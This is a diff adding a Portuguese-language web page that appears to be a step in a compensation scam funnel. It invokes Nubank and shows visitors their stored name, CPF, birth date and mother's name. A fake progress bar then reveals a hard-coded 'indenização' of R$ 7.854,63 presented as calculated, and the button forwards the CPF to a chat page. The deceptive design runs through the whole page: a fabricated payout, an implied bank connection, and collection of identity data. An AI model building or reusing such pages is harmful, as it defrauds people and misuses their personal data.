@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-TGV5XJVC');</script>
+<!-- End Google Tag Manager -->    
+    
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <meta charset="UTF-8">
+    <title>Verificação de Indenização</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-[#831BD1] text-black min-h-screen flex flex-col">
+
+    <header class="bg-white px-4 py-3 shadow-md">
+        <div class="max-w-screen-xl mx-auto flex items-center">
+            <img src="assets/logo.svg" alt="logo" class="h-16" style="margin-top: -4%; margin-bottom: -2%;">
+        </div>
+    </header>
+
+    <main class="flex-1 flex justify-center items-start px-4 py-6">
+        <div class="w-full max-w-md bg-white rounded-xl p-4 shadow-md space-y-5" style="margin-top:-4%;">
+
+            <div id="headline" class="space-y-2">
+                <h1 class="text-lg font-semibold leading-snug">
+                    Atenção, estamos calculando a sua indenização
+                </h1>
+                <p class="text-sm text-gray-700 leading-snug">
+                    Enquanto estamos verificando o valor que você possui a receber, aguarde assistindo o vídeo abaixo
+                </p>
+            </div>
+
+            <div class="w-full bg-gray-200 rounded-full h-2.5">
+                <div id="progressBar" class="bg-green-500 h-2.5 rounded-full transition-all duration-300 ease-linear"
+                    style="width: 0%;"></div>
+            </div>
+
+            <div class="aspect-video w-full rounded overflow-hidden bg-black relative">
+                <!-- Camada de overlay com botão de play personalizado -->
+                <div id="videoOverlay" class="absolute inset-0 bg-gradient-to-b from-black/40 to-black/60 flex items-center justify-center z-10 cursor-pointer">
+                    <div class="flex flex-col items-center">
+                        <div class="bg-[#831BD1] w-20 h-20 rounded-full flex items-center justify-center shadow-lg shadow-[#831BD1]/30 pulse-animation mb-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
+                            </svg>
+                        </div>
+                        <p class="text-white font-medium text-lg">Assistir vídeo</p>
+                    </div>
+                </div>
+                
+                <!-- Vídeo do YouTube com parâmetros para controle via JavaScript -->
+                <iframe id="youtubePlayer" width="100%" height="100%" src="https://www.youtube.com/embed/NNmg_KA4qM8?enablejsapi=1" title="RESGATE VALOR - vídeo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+            
+            <style>
+                .pulse-animation {
+                    animation: pulse 1.5s infinite;
+                }
+                @keyframes pulse {
+                    0% {
+                        transform: scale(1);
+                        box-shadow: 0 0 0 0 rgba(131, 27, 209, 0.7);
+                    }
+                    70% {
+                        transform: scale(1.05);
+                        box-shadow: 0 0 0 10px rgba(131, 27, 209, 0);
+                    }
+                    100% {
+                        transform: scale(1);
+                        box-shadow: 0 0 0 0 rgba(131, 27, 209, 0);
+                    }
+                }
+            </style>
+
+            <div id="btnSection" class="hidden">
+                <a onclick="redirect(event)">
+                    <button
+                        class="w-full bg-[#831BD1] text-white py-3 rounded-md font-bold text-sm hover:bg-[#6f14b5] transition">
+                        Sacar minha indenização
+                    </button>
+                </a>
+            </div>
+
+<script>
+  function redirect(event) {
+    event.preventDefault();
+    const params = new URLSearchParams(window.location.search);
+
+    // CPF puro do localStorage
+    const userData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+    const rawCpf = userData.CPF_FORMATADO ? userData.CPF_FORMATADO.replace(/[.\-]/g, '') : '';
+
+    params.set('cpf', rawCpf);
+    window.location.href = "../chat/index.html?" + params.toString();
+  }
+</script>
+
+            <div>
+                <h2 class="text-md font-bold mb-2">Sua contra Nubank foi identificada!</h2>
+
+                <div class="space-y-3 p-3 rounded-md bg-[#EFEFEF]">
+                    <div class="flex items-center gap-3">
+                        <img src="assets/1.svg" alt="" class="size-5" />
+                        <p class="text-sm">
+                            <span class="text-black font-semibold">Nome:</span>
+                            <span class="text-gray-900" id="nomeDisplay">
+                                                           
+                            </span>
+                        </p>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <img src="assets/2.svg" alt="" class="size-5" />
+                        <p class="text-sm">
+                            <span class="text-black font-semibold">Data de Nascimento:</span>
+                            <span class="text-gray-900" id="nascimentoDisplay">
+                                                            
+                            </span>
+                        </p>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <img src="assets/1.svg" alt="" class="size-5" />
+                        <p class="text-sm">
+                            <span class="text-black font-semibold">CPF:</span>
+                            <span class="text-gray-900" id="cpfDisplay">
+                                                            
+                            </span>
+                        </p>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <img src="assets/4.svg" alt="" class="size-5" />
+                        <p class="text-sm">
+                            <span class="text-black font-semibold">Mãe:</span>
+                            <span class="text-gray-900" id="maeDisplay">
+                                                            
+                            </span>
+                        </p>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <img src="assets/5.svg" alt="" class="size-5" />
+                        <p class="text-sm">
+                            <span class="text-black font-semibold">Valor disponível:</span>
+                            <span class="text-gray-900" id="valor">Calculando a sua indenização financeira…</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+    </main>
+
+    <script>
+        // Carregar dados do usuário do localStorage
+        function carregarDadosUsuario() {
+            const userData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+            
+            // Preencher os dados na página
+            document.getElementById('nomeDisplay').textContent = userData.NOME || 'NOME NÃO ENCONTRADO';
+            document.getElementById('nascimentoDisplay').textContent = userData.NASCIMENTO || '00/00/0000';
+            document.getElementById('cpfDisplay').textContent = userData.CPF_FORMATADO || '';
+            document.getElementById('maeDisplay').textContent = userData.MAE || '';
+            
+            // Se não houver dados no localStorage, tentar obter o CPF da URL
+            if (!userData.CPF_FORMATADO) {
+                const params = new URLSearchParams(window.location.search);
+                const cpf = params.get('cpf') || '';
+                if (cpf) {
+                    document.getElementById('cpfDisplay').textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+                }
+            }
+        }
+        
+        // Chamar a função quando a página carregar
+        window.addEventListener('DOMContentLoaded', carregarDadosUsuario);
+
+        let progress = 0
+        const bar = document.getElementById('progressBar')
+        const headline = document.getElementById('headline')
+        const valorTexto = document.getElementById('valor')
+        const btnSection = document.getElementById('btnSection')
+
+        // Código para o overlay do vídeo e controle do YouTube
+        const videoOverlay = document.getElementById('videoOverlay');
+        
+        // Quando o usuário clica no botão de play personalizado
+        videoOverlay.addEventListener('click', function() {
+            // Esconde o overlay
+            videoOverlay.style.opacity = '0';
+            videoOverlay.style.pointerEvents = 'none';
+            
+            // Inicia o vídeo do YouTube usando a API
+            const iframe = document.getElementById('youtubePlayer');
+            
+            // Atualiza o src do iframe para iniciar o vídeo automaticamente
+            iframe.src = iframe.src.replace('enablejsapi=1', 'enablejsapi=1&autoplay=1');
+            
+            console.log('Iniciando vídeo do YouTube');
+        });
+
+        const intervalo = setInterval(() => {
+            if (progress >= 100) {
+                clearInterval(intervalo)
+                const userData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+                const nome = userData.NOME || 'NOME NÃO ENCONTRADO';
+                headline.innerHTML = `
+                  <h1 class="text-lg font-semibold leading-snug">${nome}, o seu valor é R$ 7.854,63!</h1>
+                  <p class="text-sm text-gray-700 leading-snug">Sua indenização foi calculado com sucesso, clique no botão abaixo para realizar o seu saque indenizatório.</p>
+                `
+                valorTexto.innerText = 'R$ 7.854,63'
+                btnSection.classList.remove('hidden')
+            } else {
+                progress += 0.7407
+                bar.style.width = progress + '%'
+            }
+        }, 1000)
+    </script>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TGV5XJVC"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) --></body>
+
+</html>
